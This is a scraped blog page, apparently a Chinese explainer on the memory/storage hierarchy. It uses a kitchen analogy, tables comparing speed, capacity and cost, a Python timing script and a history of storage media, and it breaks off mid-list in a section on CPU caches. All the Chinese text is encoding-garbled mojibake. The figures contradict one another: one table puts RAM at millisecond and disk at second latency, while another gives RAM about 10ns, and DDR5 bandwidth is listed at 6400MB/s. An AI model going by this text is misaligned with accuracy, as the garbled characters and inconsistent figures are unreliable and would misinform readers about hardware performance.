                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸ’¾ ä¸ºä»€ä¹ˆç”µè„‘éœ€è¦"å†…å­˜"å’Œ"ç¡¬ç›˜"ï¼Ÿâ€”â€”å­˜å‚¨é‡‘å­—å¡”çš„ç§˜å¯† ğŸ§ </h2>
<blockquote>
<p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯æ— é™å¤§ï¼Œä»Šå¤©åˆå¸¦æ¥æœ€æ–°ä¸€æœŸçš„åä¸‡ä¸ªä¸ºä»€ä¹ˆç³»åˆ—æ–‡ç« </p>
<p>å¸Œæœ›ä»Šå¤©çš„å†…å®¹èƒ½å¯¹å¤§å®¶æœ‰æ‰€å¸®åŠ©</p>
</blockquote>
<p>æƒ³è±¡ä¸€ä¸‹ï¼Œä½ æ­£åœ¨å¨æˆ¿åšé¥­ï¼š</p>
<ul>
<li>å†°ç®±é‡Œå­˜æ”¾ç€å„ç§é£Ÿæï¼ˆå¤§ç±³ã€è”¬èœã€è‚‰ç±»ï¼‰ğŸ¥¬ğŸ—</li>
<li>ç¶å°ä¸Šçš„ç §æ¿æ”¾ç€ä½ æ­£åœ¨å¤„ç†çš„é£ŸæğŸ”ª</li>
<li>ä½ æ‰‹é‡Œæ‹¿ç€æ­£åœ¨åˆ‡çš„èœğŸ¤²</li>
</ul>
<p>ç”µè„‘çš„å­˜å‚¨ç³»ç»Ÿå…¶å®å’Œå¨æˆ¿å¾ˆåƒï¼å†…å­˜å°±åƒç §æ¿ï¼Œç¡¬ç›˜å°±åƒå†°ç®±ï¼Œè€ŒCPUå°±åƒä½ è¿™ä¸ªå¨å¸ˆã€‚ä»Šå¤©å’±ä»¬å°±æ¥æ­å¼€ç”µè„‘å­˜å‚¨çš„ç¥ç§˜é¢çº±ï¼</p>
<h3 data-id="heading-1">ğŸ“Š å­˜å‚¨é‡‘å­—å¡”ï¼šé€Ÿåº¦ä¸å®¹é‡çš„æƒè¡¡</h3>
<p>ç”µè„‘çš„å­˜å‚¨ç³»ç»Ÿæ˜¯ä¸€ä¸ª"é‡‘å­—å¡”"ç»“æ„ï¼Œè¶Šå¾€ä¸Šé€Ÿåº¦è¶Šå¿«ï¼Œä½†å®¹é‡è¶Šå°ã€æˆæœ¬è¶Šé«˜ï¼›è¶Šå¾€ä¸‹é€Ÿåº¦è¶Šæ…¢ï¼Œä½†å®¹é‡è¶Šå¤§ã€æˆæœ¬è¶Šä½ã€‚</p>















































<table><thead><tr><th>å­˜å‚¨å±‚æ¬¡</th><th>é€Ÿåº¦</th><th>å®¹é‡</th><th>æˆæœ¬</th><th>æ¯”å–»</th></tr></thead><tbody><tr><td>å¯„å­˜å™¨</td><td>âš¡ æœ€å¿«ï¼ˆçº³ç§’çº§ï¼‰</td><td>ğŸ“ æœ€å°ï¼ˆKBçº§ï¼‰</td><td>ğŸ’° æœ€è´µ</td><td>æ‰‹é‡Œçš„é£Ÿæ</td></tr><tr><td>ç¼“å­˜</td><td>âš¡ å¾ˆå¿«ï¼ˆçº³ç§’çº§ï¼‰</td><td>ğŸ“ è¾ƒå°ï¼ˆMBçº§ï¼‰</td><td>ğŸ’° å¾ˆè´µ</td><td>ç §æ¿ä¸Šçš„é£Ÿæ</td></tr><tr><td>å†…å­˜</td><td>ğŸš€ å¿«ï¼ˆæ¯«ç§’çº§ï¼‰</td><td>ğŸ“¦ ä¸­ç­‰ï¼ˆGBçº§ï¼‰</td><td>ğŸ’¸ è¾ƒè´µ</td><td>å¨æˆ¿å°é¢ä¸Šçš„é£Ÿæ</td></tr><tr><td>ç¡¬ç›˜</td><td>ğŸŒ æ…¢ï¼ˆç§’çº§ï¼‰</td><td>ğŸ“š å¤§ï¼ˆTBçº§ï¼‰</td><td>ğŸ’° ä¾¿å®œ</td><td>å†°ç®±é‡Œçš„é£Ÿæ</td></tr><tr><td>äº‘å­˜å‚¨</td><td>ğŸ¢ å¾ˆæ…¢ï¼ˆç½‘ç»œå»¶è¿Ÿï¼‰</td><td>ğŸŒ æ— é™å¤§</td><td>ğŸ’¸ æŒ‰éœ€ä»˜è´¹</td><td>è¶…å¸‚é‡Œçš„é£Ÿæ</td></tr></tbody></table>
<h3 data-id="heading-2">ğŸ¤” æ ¸å¿ƒé—®é¢˜ï¼šä¸ºä»€ä¹ˆä¸èƒ½åªæœ‰ä¸€ç§å­˜å‚¨è®¾å¤‡ï¼Ÿ</h3>
<p>æœ‰äººå¯èƒ½ä¼šé—®ï¼š"æ—¢ç„¶å†…å­˜è¿™ä¹ˆå¿«ï¼Œä¸ºä»€ä¹ˆä¸æŠŠæ‰€æœ‰å­˜å‚¨éƒ½åšæˆå†…å­˜ï¼Ÿ"æˆ–è€…"æ—¢ç„¶ç¡¬ç›˜è¿™ä¹ˆä¾¿å®œï¼Œä¸ºä»€ä¹ˆä¸åªç”¨ç¡¬ç›˜ï¼Ÿ"</p>
<p>è¿™å°±åƒé—®ï¼š"æ—¢ç„¶ç §æ¿è¿™ä¹ˆæ–¹ä¾¿ï¼Œä¸ºä»€ä¹ˆä¸æŠŠå¨æˆ¿éƒ½æ”¹æˆç §æ¿ï¼Ÿ"æˆ–è€…"æ—¢ç„¶å†°ç®±èƒ½è£…å¾ˆå¤šä¸œè¥¿ï¼Œä¸ºä»€ä¹ˆè¿˜è¦ç §æ¿ï¼Ÿ"</p>
<p>ç­”æ¡ˆå¾ˆç®€å•ï¼š<strong>é€Ÿåº¦ã€å®¹é‡ã€æˆæœ¬ä¸‰è€…ä¸å¯å…¼å¾—</strong>ï¼</p>
<h4 data-id="heading-3">1. ğŸš€ é€Ÿåº¦çš„å·®å¼‚</h4>
<p>å†…å­˜çš„é€Ÿåº¦æ¯”ç¡¬ç›˜å¿«<strong>1000å€ä»¥ä¸Š</strong>ï¼è®©æˆ‘ä»¬çœ‹ä¸€ç»„è¶£å‘³æ•°æ®ï¼š</p>






























<table><thead><tr><th>å­˜å‚¨è®¾å¤‡</th><th>è¯»å†™é€Ÿåº¦</th><th>è®¿é—®å»¶è¿Ÿ</th></tr></thead><tbody><tr><td>DDR5å†…å­˜</td><td>6400MB/s</td><td>çº¦10ns</td></tr><tr><td>NVMe SSD</td><td>7000MB/s</td><td>çº¦100Î¼s</td></tr><tr><td>SATA SSD</td><td>550MB/s</td><td>çº¦500Î¼s</td></tr><tr><td>HDDç¡¬ç›˜</td><td>150MB/s</td><td>çº¦10ms</td></tr></tbody></table>
<p><strong>æ³¨æ„</strong>ï¼šè™½ç„¶NVMe SSDçš„è¿ç»­è¯»å†™é€Ÿåº¦çœ‹èµ·æ¥å’ŒDDR5å†…å­˜å·®ä¸å¤šï¼Œä½†è®¿é—®å»¶è¿Ÿå·®äº†10000å€ï¼è¿™å°±åƒä½ å»ä¾¿åˆ©åº—ä¹°ä¸œè¥¿ï¼ˆå†…å­˜ï¼‰å’Œå»è¶…å¸‚ä¹°ä¸œè¥¿ï¼ˆç¡¬ç›˜ï¼‰â€”â€”è™½ç„¶è¶…å¸‚å•æ¬¡èƒ½ä¹°æ›´å¤šï¼Œä½†æ¯æ¬¡éƒ½è¦èŠ±æ›´å¤šæ—¶é—´åœ¨è·¯ä¸Šã€‚</p>
<h4 data-id="heading-4">2. ğŸ“¦ å®¹é‡çš„å·®å¼‚</h4>
<p>ç¡¬ç›˜çš„å®¹é‡æ¯”å†…å­˜å¤§å¾—å¤šï¼š</p>
<ul>
<li>æ™®é€šç”µè„‘å†…å­˜ï¼š8GB-64GB</li>
<li>æ™®é€šç”µè„‘ç¡¬ç›˜ï¼š512GB-4TB</li>
<li>ä¸“ä¸šæœåŠ¡å™¨ç¡¬ç›˜ï¼šç”šè‡³å¯è¾¾100TBä»¥ä¸Š</li>
</ul>
<p>è¿™å°±åƒç §æ¿åªèƒ½æ”¾å‡ é“èœï¼Œè€Œå†°ç®±èƒ½æ”¾ä¸€å‘¨çš„é£Ÿæï¼</p>
<h4 data-id="heading-5">3. ğŸ’° æˆæœ¬çš„å·®å¼‚</h4>
<p>å†…å­˜çš„æˆæœ¬æ¯”ç¡¬ç›˜é«˜å¾—å¤šï¼š</p>
<ul>
<li>DDR5å†…å­˜ï¼šçº¦10å…ƒ/GB</li>
<li>NVMe SSDï¼šçº¦1å…ƒ/GB</li>
<li>HDDç¡¬ç›˜ï¼šçº¦0.1å…ƒ/GB</li>
</ul>
<p>å¦‚æœæŠŠä¸€å°ç”µè„‘çš„æ‰€æœ‰å­˜å‚¨éƒ½æ¢æˆå†…å­˜ï¼Œæˆæœ¬ä¼šé«˜åˆ°ç¦»è°±ï¼</p>
<h3 data-id="heading-6">ğŸ§  å†…å­˜ vs ç¡¬ç›˜ï¼šæœ¬è´¨åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<h4 data-id="heading-7">å†…å­˜ï¼šç”µè„‘çš„"ä¸´æ—¶å·¥ä½œå°"</h4>
<p>å†…å­˜ï¼ˆRAMï¼‰æ˜¯ç”µè„‘çš„ä¸´æ—¶å­˜å‚¨ï¼Œå°±åƒå¨æˆ¿çš„ç §æ¿ï¼š</p>
<ul>
<li><strong>é€Ÿåº¦å¿«</strong>ï¼šCPUèƒ½ç›´æ¥è®¿é—®ï¼Œå»¶è¿Ÿæä½</li>
<li><strong>æ˜“å¤±æ€§</strong>ï¼šæ–­ç”µåæ•°æ®ä¼šä¸¢å¤±ï¼ˆå°±åƒä½ åˆ‡å®Œèœï¼Œç §æ¿å°±ç©ºäº†ï¼‰</li>
<li><strong>å®¹é‡å°</strong>ï¼šé€šå¸¸8GB-64GB</li>
<li><strong>ç”¨é€”</strong>ï¼šå­˜æ”¾æ­£åœ¨è¿è¡Œçš„ç¨‹åºå’Œæ•°æ®</li>
</ul>
<h4 data-id="heading-8">ç¡¬ç›˜ï¼šç”µè„‘çš„"æ°¸ä¹…ä»“åº“"</h4>
<p>ç¡¬ç›˜ï¼ˆHDD/SSDï¼‰æ˜¯ç”µè„‘çš„æ°¸ä¹…å­˜å‚¨ï¼Œå°±åƒå¨æˆ¿çš„å†°ç®±ï¼š</p>
<ul>
<li><strong>é€Ÿåº¦æ…¢</strong>ï¼šCPUéœ€è¦é€šè¿‡å†…å­˜æ‰èƒ½è®¿é—®</li>
<li><strong>éæ˜“å¤±æ€§</strong>ï¼šæ–­ç”µåæ•°æ®ä¸ä¼šä¸¢å¤±ï¼ˆå°±åƒé£Ÿææ”¾åœ¨å†°ç®±é‡Œä¸ä¼šåï¼‰</li>
<li><strong>å®¹é‡å¤§</strong>ï¼šé€šå¸¸512GB-4TB</li>
<li><strong>ç”¨é€”</strong>ï¼šå­˜æ”¾æ“ä½œç³»ç»Ÿã€ç¨‹åºã€æ–‡ä»¶ç­‰é•¿æœŸæ•°æ®</li>
</ul>
<h3 data-id="heading-9">ğŸ”„ ç”µè„‘æ˜¯å¦‚ä½•ä½¿ç”¨å­˜å‚¨çš„ï¼Ÿ</h3>
<p>å½“ä½ æ‰“å¼€ä¸€ä¸ªç¨‹åºï¼ˆæ¯”å¦‚Chromeæµè§ˆå™¨ï¼‰æ—¶ï¼Œç”µè„‘ä¼šï¼š</p>
<ol>
<li>ğŸ“¥ ä»ç¡¬ç›˜è¯»å–Chromeçš„ç¨‹åºæ–‡ä»¶åˆ°å†…å­˜</li>
<li>ğŸš€ CPUä»å†…å­˜ä¸­è¯»å–æŒ‡ä»¤å¹¶æ‰§è¡Œ</li>
<li>ğŸ’¾ è¿è¡Œè¿‡ç¨‹ä¸­äº§ç”Ÿçš„æ•°æ®æš‚æ—¶å­˜æ”¾åœ¨å†…å­˜ä¸­</li>
<li>ğŸ’¾ å½“ä½ ä¿å­˜æ–‡ä»¶æˆ–å…³é—­ç¨‹åºæ—¶ï¼Œæ•°æ®ä¼šå†™å›ç¡¬ç›˜</li>
</ol>
<p>è¿™å°±åƒä½ åšé¥­çš„è¿‡ç¨‹ï¼š</p>
<ol>
<li>ğŸ¥¬ ä»å†°ç®±æ‹¿å‡ºè”¬èœåˆ°ç §æ¿</li>
<li>ğŸ”ª åœ¨ç §æ¿ä¸Šåˆ‡èœ</li>
<li>ğŸ³ æŠŠåˆ‡å¥½çš„èœæ”¾è¿›é”…é‡Œç‚’</li>
<li>ğŸ½ï¸ ç‚’å¥½çš„èœç››åˆ°ç›˜å­é‡Œï¼ˆç›¸å½“äºä¿å­˜åˆ°ç¡¬ç›˜ï¼‰</li>
</ol>
<h3 data-id="heading-10">ğŸ“ ä»£ç å®ä¾‹ï¼šå†…å­˜ä¸ç¡¬ç›˜çš„åŒºåˆ«</h3>
<p>è®©æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªç®€å•çš„Pythonä»£ç æ¥ç†è§£å†…å­˜å’Œç¡¬ç›˜çš„åŒºåˆ«ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ç¤ºä¾‹1ï¼šå†…å­˜æ“ä½œï¼ˆå¿«ï¼‰</span>
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">def</span> <span class="hljs-title function_">memory_operation</span>():
    <span class="hljs-comment"># åœ¨å†…å­˜ä¸­åˆ›å»ºä¸€ä¸ªå¤§åˆ—è¡¨</span>
    start_time = time.time()
    big_list = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000000</span>)]
    <span class="hljs-comment"># å¯¹åˆ—è¡¨è¿›è¡Œæ“ä½œ</span>
    <span class="hljs-built_in">sum</span>(big_list)
    end_time = time.time()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å†…å­˜æ“ä½œè€—æ—¶ï¼š<span class="hljs-subst">{end_time - start_time:<span class="hljs-number">.4</span>f}</span>ç§’"</span>)

<span class="hljs-comment"># ç¤ºä¾‹2ï¼šç¡¬ç›˜æ“ä½œï¼ˆæ…¢ï¼‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">disk_operation</span>():
    <span class="hljs-comment"># å†™å…¥å¤§æ–‡ä»¶åˆ°ç¡¬ç›˜</span>
    start_time = time.time()
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"big_file.txt"</span>, <span class="hljs-string">"w"</span>) <span class="hljs-keyword">as</span> f:
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000000</span>):
            f.write(<span class="hljs-string">f"<span class="hljs-subst">{i}</span>\n"</span>)
    <span class="hljs-comment"># ä»ç¡¬ç›˜è¯»å–æ–‡ä»¶</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"big_file.txt"</span>, <span class="hljs-string">"r"</span>) <span class="hljs-keyword">as</span> f:
        content = f.read()
    end_time = time.time()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç¡¬ç›˜æ“ä½œè€—æ—¶ï¼š<span class="hljs-subst">{end_time - start_time:<span class="hljs-number">.4</span>f}</span>ç§’"</span>)

<span class="hljs-comment"># è¿è¡Œæµ‹è¯•</span>
memory_operation()  <span class="hljs-comment"># è¾“å‡ºï¼šçº¦0.1ç§’</span>
<span class="hljs-comment"># disk_operation()  # è¾“å‡ºï¼šçº¦10ç§’ï¼ˆè°¨æ…è¿è¡Œï¼Œä¼šç”Ÿæˆå¤§æ–‡ä»¶ï¼‰</span>
</code></pre>
<p><strong>è¿è¡Œç»“æœå¯¹æ¯”</strong>ï¼š</p>
<ul>
<li>å†…å­˜æ“ä½œï¼šçº¦0.1ç§’</li>
<li>ç¡¬ç›˜æ“ä½œï¼šçº¦10ç§’</li>
</ul>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆç”µè„‘éœ€è¦å†…å­˜â€”â€”å¦‚æœæ‰€æœ‰æ“ä½œéƒ½ç›´æ¥åœ¨ç¡¬ç›˜ä¸Šè¿›è¡Œï¼Œä½ çš„ç”µè„‘ä¼šæ…¢å¾—åƒèœ—ç‰›ï¼ğŸŒ</p>
<h3 data-id="heading-11">ğŸ“œ å­˜å‚¨è®¾å¤‡çš„"è¿›åŒ–å²"</h3>
<h4 data-id="heading-12">1. ğŸ“€ è½¯ç›˜æ—¶ä»£ï¼šä»5.25è‹±å¯¸åˆ°3.5è‹±å¯¸</h4>
<p>20ä¸–çºª70å¹´ä»£ï¼Œè½¯ç›˜æ˜¯ç”µè„‘çš„ä¸»è¦å­˜å‚¨è®¾å¤‡ã€‚æœ€æ—©çš„è½¯ç›˜æ˜¯5.25è‹±å¯¸ï¼Œå®¹é‡åªæœ‰360KBâ€”â€”åªèƒ½å­˜ä¸€ç¯‡çŸ­æ–‡ç« ï¼åæ¥è¿›åŒ–åˆ°3.5è‹±å¯¸è½¯ç›˜ï¼Œå®¹é‡æå‡åˆ°1.44MBã€‚</p>
<p>è¿˜è®°å¾—é‚£äº›å¸¦ç€"Aç›˜"å’Œ"Bç›˜"çš„ç”µè„‘å—ï¼Ÿé‚£æ—¶å€™å®‰è£…è½¯ä»¶è¦æ’åå‡ å¼ è½¯ç›˜ï¼Œä¸å°å¿ƒæ’é”™é¡ºåºå°±å¾—é‡æ¥ï¼ğŸ’¾</p>
<h4 data-id="heading-13">2. ğŸ’¿ ç¡¬ç›˜æ—¶ä»£ï¼šä»MBåˆ°TB</h4>
<p>1956å¹´ï¼ŒIBMæ¨å‡ºäº†ä¸–ç•Œä¸Šç¬¬ä¸€å°ç¡¬ç›˜ï¼Œå®¹é‡åªæœ‰5MBï¼Œå´æœ‰ä¸€ä¸ªå†°ç®±é‚£ä¹ˆå¤§ï¼åæ¥ç¡¬ç›˜æŠ€æœ¯ä¸æ–­è¿›æ­¥ï¼š</p>
<ul>
<li>1980å¹´ï¼šIBM XTç¡¬ç›˜ï¼Œ10MB</li>
<li>1990å¹´ï¼šå¸Œæ·ç¡¬ç›˜ï¼Œ1GB</li>
<li>2000å¹´ï¼šè¿ˆæ‹“ç¡¬ç›˜ï¼Œ100GB</li>
<li>2010å¹´ï¼šè¥¿éƒ¨æ•°æ®ç¡¬ç›˜ï¼Œ1TB</li>
<li>2020å¹´ï¼šå¸Œæ·ç¡¬ç›˜ï¼Œ18TB</li>
</ul>
<h4 data-id="heading-14">3. âš¡ SSDé©å‘½ï¼šä»æœºæ¢°åˆ°å›ºæ€</h4>
<p>2007å¹´ï¼Œè‹¹æœåœ¨MacBook Airä¸Šé¦–æ¬¡ä½¿ç”¨SSDï¼Œæ ‡å¿—ç€å›ºæ€ç¡¬ç›˜æ—¶ä»£çš„åˆ°æ¥ã€‚SSDï¼ˆå›ºæ€ç¡¬ç›˜ï¼‰æ²¡æœ‰æœºæ¢°éƒ¨ä»¶ï¼Œè¯»å†™é€Ÿåº¦æ¯”HDDï¼ˆæœºæ¢°ç¡¬ç›˜ï¼‰å¿«å¾—å¤šï¼š</p>








































<table><thead><tr><th>ç‰¹æ€§</th><th>HDDï¼ˆæœºæ¢°ç¡¬ç›˜ï¼‰</th><th>SSDï¼ˆå›ºæ€ç¡¬ç›˜ï¼‰</th></tr></thead><tbody><tr><td>åŸç†</td><td>æœºæ¢°ç£å¤´+ç›˜ç‰‡</td><td>é—ªå­˜èŠ¯ç‰‡</td></tr><tr><td>é€Ÿåº¦</td><td>100-200MB/s</td><td>550MB/sï¼ˆSATAï¼‰- 7000MB/sï¼ˆNVMeï¼‰</td></tr><tr><td>å™ªéŸ³</td><td>ğŸ“£ æœ‰å™ªéŸ³ï¼ˆæœºæ¢°è½¬åŠ¨ï¼‰</td><td>ğŸ¤« æ— å™ªéŸ³</td></tr><tr><td>æŠ—éœ‡æ€§</td><td>âŒ æ€•éœ‡åŠ¨</td><td>âœ… æŠ—éœ‡</td></tr><tr><td>åŠŸè€—</td><td>é«˜</td><td>ä½</td></tr><tr><td>å¯¿å‘½</td><td>3-5å¹´</td><td>5-10å¹´</td></tr></tbody></table>
<h4 data-id="heading-15">4. â˜ï¸ äº‘å­˜å‚¨æ—¶ä»£ï¼šæ— é™å®¹é‡</h4>
<p>éšç€ç½‘ç»œæŠ€æœ¯çš„å‘å±•ï¼Œäº‘å­˜å‚¨æˆä¸ºäº†æ–°çš„é€‰æ‹©ã€‚ä½ å¯ä»¥æŠŠæ–‡ä»¶å­˜åˆ°äº‘ç«¯ï¼Œéšæ—¶éšåœ°è®¿é—®ã€‚äº‘å­˜å‚¨çš„ä¼˜åŠ¿æ˜¯ï¼š</p>
<ul>
<li>ğŸŒ æ— é™å®¹é‡ï¼ˆæŒ‰éœ€ä»˜è´¹ï¼‰</li>
<li>ğŸ“± è·¨è®¾å¤‡è®¿é—®</li>
<li>ğŸ›¡ï¸ æ•°æ®å¤‡ä»½å’Œæ¢å¤</li>
<li>ğŸ“¤ æ–¹ä¾¿åˆ†äº«</li>
</ul>
<p>ä½†äº‘å­˜å‚¨ä¹Ÿæœ‰ç¼ºç‚¹ï¼š</p>
<ul>
<li>ğŸŒ å—ç½‘ç»œé€Ÿåº¦é™åˆ¶</li>
<li>ğŸ’° éœ€è¦æŒç»­ä»˜è´¹</li>
<li>ğŸ”’ éšç§å’Œå®‰å…¨ concerns</li>
</ul>
<h3 data-id="heading-16">ğŸ§© ç¼“å­˜ï¼šå†…å­˜å’ŒCPUä¹‹é—´çš„"åŠ é€Ÿå¸¦"</h3>
<p>é™¤äº†å†…å­˜å’Œç¡¬ç›˜ï¼Œè¿˜æœ‰ä¸€ä¸ªé‡è¦çš„å­˜å‚¨å±‚æ¬¡â€”â€”<strong>ç¼“å­˜</strong>ï¼ç¼“å­˜æ˜¯CPUå’Œå†…å­˜ä¹‹é—´çš„"åŠ é€Ÿå¸¦"ï¼Œé€Ÿåº¦æ¯”å†…å­˜è¿˜å¿«ã€‚</p>
<p>ç¼“å­˜åˆ†ä¸ºä¸‰çº§ï¼š</p>
<ul>
